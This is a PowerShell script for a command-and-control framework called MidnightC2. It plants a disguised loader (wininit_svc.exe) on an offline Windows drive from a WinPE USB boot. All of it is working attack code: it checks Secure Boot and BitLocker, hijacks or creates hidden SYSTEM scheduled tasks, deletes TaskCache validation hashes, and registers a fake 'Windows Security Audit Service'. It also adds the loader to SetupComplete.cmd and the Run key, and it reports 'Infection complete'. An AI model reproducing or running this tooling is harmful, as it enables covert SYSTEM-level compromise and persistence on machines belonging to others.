# WinPE Offline Injector for MidnightC2
# ---------------------------------------------------------
# Description: This script automates the process of hijacking 
#              a Scheduled Task in an offline Windows installation.
# ---------------------------------------------------------

param(
    [switch]$Auto
)

$ErrorActionPreference = "Continue"

function Write-Info($msg) { Write-Host "[*] $msg" -ForegroundColor Cyan }
function Write-Success($msg) { Write-Host "[√] $msg" -ForegroundColor White }
function Write-Warning($msg) { Write-Host "[!] $msg" -ForegroundColor Yellow }
function Write-ErrorMsg($msg) { Write-Host "[X] $msg" -ForegroundColor Red }

Clear-Host
Write-Host "========================================" -ForegroundColor Magenta
Write-Host "  MidnightC2 WinPE Offline Injector     " -ForegroundColor Magenta
Write-Host "========================================" -ForegroundColor Magenta
Write-Host ""

# --- 1. Security Checks ---
Write-Info "Performing Pre-flight Checks..."

$bitlockerPass = $true
$secureBootPass = $true

# Check Secure Boot
try {
    $secureBootStatus = Confirm-SecureBootUEFI -ErrorAction Stop
    if ($secureBootStatus) {
        Write-ErrorMsg "Secure Boot is ENABLED! The payload may not execute or might be blocked."
        $secureBootPass = $false
    } else {
        Write-Success "Secure Boot is Disabled."
    }
} catch {
    Write-Success "Secure Boot is Not Supported or Disabled (Legacy/BIOS)."
}

# Find Windows System Drive
Write-Info "Searching for Windows System Drive..."
$drives = Get-PSDrive -PSProvider FileSystem | Where-Object { $_.Free -ne $null -and $_.Root -match "^[a-zA-Z]:\\$" }
$windowsDrive = $null

foreach ($drive in $drives) {
    if (Test-Path "$($drive.Root)Windows\System32\Tasks") {
        $windowsDrive = $drive.Root
        break
    }
}

if (-not $windowsDrive) {
    Write-ErrorMsg "Could not find Windows installation. It might be locked by BitLocker or not present."
    $bitlockerPass = $false
} else {
    try {
        $bdeOutput = manage-bde -status $windowsDrive.Substring(0,2) 2>&1
        if ($bdeOutput -match "Protection On" -or $bdeOutput -match "\sLocked") {
            Write-ErrorMsg "BitLocker Protection is ON for $windowsDrive! However, the drive seems readable from WinPE."
        } else {
            Write-Success "BitLocker is Disabled / Unlocked on $windowsDrive."
        }
    } catch {
        Write-Success "Drive $windowsDrive is readable (No active BitLocker blocking access)."
    }
}

if (-not $bitlockerPass) {
    Write-ErrorMsg "Critical checks failed. Cannot proceed."
    exit 1
}

if (-not $secureBootPass -and -not $Auto) {
    Write-Warning "Secure Boot is enabled. Do you still want to proceed? (Y/N)"
    $ans = Read-Host
    if ($ans -notmatch "^(?i)y.*") {
        Write-ErrorMsg "Aborting infection."
        exit 1
    }
}

Write-Host ""
Write-Success "All checks passed! Target drive: $windowsDrive"
Write-Host ""

# --- 2. Interactive Menu for Tasks ---
$tasks = @(
    @{
        Name = "Consolidator (Customer Experience)"
        Path = "Microsoft\Windows\Customer Experience Improvement Program\Consolidator"
        Desc = "Runs frequently as LOCALSYSTEM."
    },
    @{
        Name = "ScheduledDefrag (Defrag)"
        Path = "Microsoft\Windows\Defrag\ScheduledDefrag"
        Desc = "Runs as SYSTEM. Maintenance task."
    },
    @{
        Name = "ReportPolicies (UpdateOrchestrator)"
        Path = "Microsoft\Windows\UpdateOrchestrator\ReportPolicies"
        Desc = "Runs as SYSTEM. Windows Update task."
    },
    @{
        Name = "Create NEW Stealthy Task (Microsoft Security Update)"
        Path = "CREATE_NEW"
        Desc = "Creates a brand new task that looks like a system update."
    },
    @{
        Name = "Auto-Find ANY existing SYSTEM Task (Safest)"
        Path = "AUTO"
        Desc = "Scans the machine for any valid task and hijacks it."
    }
)

[int]$choice = 0
if ($Auto) {
    Write-Info "Auto-Mode Enabled. Selecting Option [4] (Create NEW Task) by default."
    $choice = 4
} else {
    Write-Info "Select an Option:"
    for ($i = 0; $i -lt $tasks.Count; $i++) {
        Write-Host "  [$($i + 1)] $($tasks[$i].Name)" -ForegroundColor Cyan
        Write-Host "      Note: $($tasks[$i].Desc)" -ForegroundColor DarkGray
    }
    Write-Host ""

    while ($choice -lt 1 -or $choice -gt $tasks.Count) {
        $inputChoice = Read-Host "Enter Choice (1-$($tasks.Count))"
        if ([int]::TryParse($inputChoice, [ref]$choice) -and $choice -ge 1 -and $choice -le $tasks.Count) {
            break
        }
        Write-Warning "Invalid choice. Try again."
    }
}

$taskName = ""
$taskPath = ""
$isNewTask = $false

if ($tasks[$choice - 1].Path -eq "AUTO") {
    Write-Info "Scanning for an existing Task..."
    $tasksDir = Join-Path $windowsDrive "Windows\System32\Tasks"
    $allTasks = Get-ChildItem -Path $tasksDir -File -Recurse | Select-Object -First 20
    $found = $false
    foreach ($file in $allTasks) {
        try {
            [xml]$tempXml = Get-Content $file.FullName -ErrorAction Stop
            $nsTemp = New-Object System.Xml.XmlNamespaceManager($tempXml.NameTable)
            $nsTemp.AddNamespace("t", "http://schemas.microsoft.com/windows/2004/02/mit/task")
            if ($tempXml.SelectSingleNode("//t:Exec", $nsTemp)) {
                $taskPath = $file.FullName
                $taskName = $file.FullName.Substring($tasksDir.Length + 1)
                $found = $true
                break
            }
        } catch { }
    }
    
    if (-not $found) {
        Write-ErrorMsg "Could not find any suitable tasks to hijack! Proceeding to fallback."
        $taskPath = ""
    } else {
        Write-Success "Auto-Selected Task: $taskName"
    }
} elseif ($tasks[$choice - 1].Path -eq "CREATE_NEW") {
    Write-Info "Preparing to create a NEW task..."
    $taskName = "Microsoft\Windows\Security\SecurityRefresh"
    $taskPath = Join-Path $windowsDrive "Windows\System32\Tasks\$taskName"
    $isNewTask = $true
} else {
    $taskName = $tasks[$choice - 1].Path
    $taskPath = Join-Path $windowsDrive "Windows\System32\Tasks\$taskName"
    Write-Success "Selected Task: $taskName"
}
Write-Host ""

# --- 3. Define Paths ---
$payloadSource = Join-Path $PSScriptRoot "midnight_loader.exe"
if (-not (Test-Path $payloadSource)) {
    $payloadSource = Join-Path $PSScriptRoot "MidnightLoader\target\release\midnight_loader.exe"
}

$payloadDestDir = Join-Path $windowsDrive "Windows\Temp"
$payloadDest = Join-Path $payloadDestDir "wininit_svc.exe"

# --- 4. Check for Payload ---
if (-not (Test-Path $payloadSource)) {
    Write-ErrorMsg "Payload 'midnight_loader.exe' not found!"
    exit 1
}
Write-Success "Payload found: $payloadSource"

# --- 5. Copy Payload ---
Write-Info "Copying payload to $payloadDest..."
try {
    if (-not (Test-Path $payloadDestDir)) {
        New-Item -Path $payloadDestDir -ItemType Directory -Force | Out-Null
    }
    Copy-Item -Path $payloadSource -Destination $payloadDest -Force -ErrorAction Stop
    Write-Success "Payload copied successfully."
} catch {
    Write-ErrorMsg "Failed to copy payload: $_"
    exit 1
}

# --- 6. Inject Task XML ---
$isFallback = $false

if ($taskPath -ne "" -and ($isNewTask -or (Test-Path $taskPath))) {
    Write-Info "Injecting Task XML..."
    try {
        if ($isNewTask) {
            $taskDir = [System.IO.Path]::GetDirectoryName($taskPath)
            if (-not (Test-Path $taskDir)) { New-Item -Path $taskDir -ItemType Directory -Force | Out-Null }
            
            $template = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Description>Windows Security Health Refresh</Description>
  </RegistrationInfo>
  <Triggers>
    <LogonTrigger><Enabled>true</Enabled></LogonTrigger>
    <TimeTrigger>
      <Repetition><Interval>PT5M</Interval></Repetition>
      <StartBoundary>2020-01-01T00:00:00</StartBoundary>
      <Enabled>true</Enabled>
    </TimeTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>C:\Windows\Temp\wininit_svc.exe</Command>
      <Arguments>agent</Arguments>
    </Exec>
  </Actions>
</Task>
"@
            [xml]$xml = [xml]$template
        } else {
            $backupPath = "$taskPath.bak"
            if (-not (Test-Path $backupPath)) { Copy-Item $taskPath $backupPath -Force }

            [xml]$xml = Get-Content $taskPath
            $ns = New-Object System.Xml.XmlNamespaceManager($xml.NameTable)
            $ns.AddNamespace("t", "http://schemas.microsoft.com/windows/2004/02/mit/task")

            $execAction = $xml.SelectSingleNode("//t:Exec", $ns)
            if ($execAction) {
                $command = $execAction.SelectSingleNode("t:Command", $ns)
                if ($command) { $command.InnerText = "C:\Windows\Temp\wininit_svc.exe" }
                
                $arguments = $execAction.SelectSingleNode("t:Arguments", $ns)
                if ($arguments) {
                    $arguments.InnerText = "agent"
                } else {
                    $newArgNode = $xml.CreateElement("Arguments", "http://schemas.microsoft.com/windows/2004/02/mit/task")
                    $newArgNode.InnerText = "agent"
                    $execAction.AppendChild($newArgNode) | Out-Null
                }
            }
        }
        
        $xml.Save($taskPath)
        Write-Success "Task XML Prepared."

        # Registry Bypass & Registration
        Write-Info "Registering Task in Windows Registry..."
        $softwareHive = Join-Path $windowsDrive "Windows\System32\config\SOFTWARE"
        $offlineHivePath = "HKLM\OfflineSoft"

        $regResult = reg.exe load $offlineHivePath $softwareHive 2>&1
        if ($LASTEXITCODE -eq 0) {
            try {
                if ($isNewTask) {
                    # Registering a NEW task offline is complex, so we ensure the Run key is ALSO set
                    Write-Warning "New Task created. Note: It may require a manual start or trigger. Applying Run-Key for immediate execution."
                    $isFallback = $true 
                } else {
                    $treePath = "HKLM:\OfflineSoft\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\$taskName"
                    if (Test-Path $treePath) {
                        $taskId = (Get-ItemProperty -Path $treePath -Name "Id").Id
                        $hashPath = "HKLM:\OfflineSoft\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\$taskId"
                        if (Test-Path $hashPath) {
                            Remove-ItemProperty -Path $hashPath -Name "Hash" -ErrorAction SilentlyContinue
                            Write-Success "Validation Hash deleted. XML hijacked successfully."
                        }
                    }
                }
            } finally {
                [gc]::Collect(); [gc]::WaitForPendingFinalizers(); Start-Sleep -Seconds 1
                reg.exe unload $offlineHivePath | Out-Null
            }
        }
    } catch {
        Write-ErrorMsg "Error during XML Injection: $_"
        $isFallback = $true
    }
} else {
    $isFallback = $true
}

# --- 7. ULTIMATE PERSISTENCE: Windows Service (Guaranteed SYSTEM) ---
Write-Info "Injecting Windows Service (LocalSystem Entry Point)..."
$systemHive = Join-Path $windowsDrive "Windows\System32\config\SYSTEM"
$regResult = reg.exe load HKLM\OfflineSys $systemHive 2>&1
if ($LASTEXITCODE -eq 0) {
    try {
        # Determine CurrentControlSet
        $selectPath = "HKLM:\OfflineSys\Select"
        $current = (Get-ItemProperty -Path $selectPath -Name "Current" -ErrorAction Stop).Current
        $controlSet = "ControlSet00" + $current
        $servicePath = "HKLM:\OfflineSys\$controlSet\Services\WinSecAudit"

        if (-not (Test-Path $servicePath)) {
            New-Item -Path $servicePath -Force | Out-Null
        }
        
        New-ItemProperty -Path $servicePath -Name "DisplayName" -PropertyType String -Value "Windows Security Audit Service" -Force | Out-Null
        New-ItemProperty -Path $servicePath -Name "Description" -PropertyType String -Value "Monitor and audit security policy changes on the local system." -Force | Out-Null
        New-ItemProperty -Path $servicePath -Name "ImagePath" -PropertyType ExpandString -Value "C:\Windows\Temp\wininit_svc.exe agent" -Force | Out-Null
        New-ItemProperty -Path $servicePath -Name "ObjectName" -PropertyType String -Value "LocalSystem" -Force | Out-Null
        New-ItemProperty -Path $servicePath -Name "Start" -PropertyType DWord -Value 2 -Force | Out-Null
        New-ItemProperty -Path $servicePath -Name "Type" -PropertyType DWord -Value 16 -Force | Out-Null
        New-ItemProperty -Path $servicePath -Name "ErrorControl" -PropertyType DWord -Value 0 -Force | Out-Null

        Write-Success "Windows Service 'WinSecAudit' injected as SYSTEM."
    } catch {
        Write-ErrorMsg "Failed to inject service: $_"
    } finally {
        [gc]::Collect(); [gc]::WaitForPendingFinalizers(); Start-Sleep -Seconds 1
        reg.exe unload HKLM\OfflineSys | Out-Null
    }
} else {
    Write-ErrorMsg "Could not load SYSTEM registry hive."
}

# --- 8. Primary Backup: SetupComplete.cmd ---
Write-Info "Injecting SetupComplete.cmd..."
$scriptsDir = Join-Path $windowsDrive "Windows\Setup\Scripts"
if (-not (Test-Path $scriptsDir)) { New-Item -Path $scriptsDir -ItemType Directory -Force | Out-Null }
$setupCmd = Join-Path $scriptsDir "SetupComplete.cmd"
$cmdContent = "@echo off`r`nstart /b C:\Windows\Temp\wininit_svc.exe agent`r`n"
Add-Content -Path $setupCmd -Value $cmdContent
Write-Success "SetupComplete.cmd injected. Payload will run as SYSTEM on boot."

# --- 8. Fallback (Run Key for User Context) ---
Write-Info "Applying User-Mode Guard (Run Key)..."
$softwareHive = Join-Path $windowsDrive "Windows\System32\config\SOFTWARE"
$regResult = reg.exe load HKLM\OfflineSoft $softwareHive 2>&1
if ($LASTEXITCODE -eq 0) {
    try {
        $runKeyPath = "HKLM:\OfflineSoft\Microsoft\Windows\CurrentVersion\Run"
        Set-ItemProperty -Path $runKeyPath -Name "WindowsSecurityHost" -Value "C:\Windows\Temp\wininit_svc.exe agent"
        Write-Success "Injected into HKLM Run Key."
    } finally {
        [gc]::Collect(); [gc]::WaitForPendingFinalizers(); Start-Sleep -Seconds 1
        reg.exe unload HKLM\OfflineSoft | Out-Null
    }
}

Write-Host "`n[DONE] Infection complete. Payload: C:\Windows\Temp\wininit_svc.exe" -ForegroundColor Green
Write-Host "Please remove USB and reboot target machine." -ForegroundColor Green
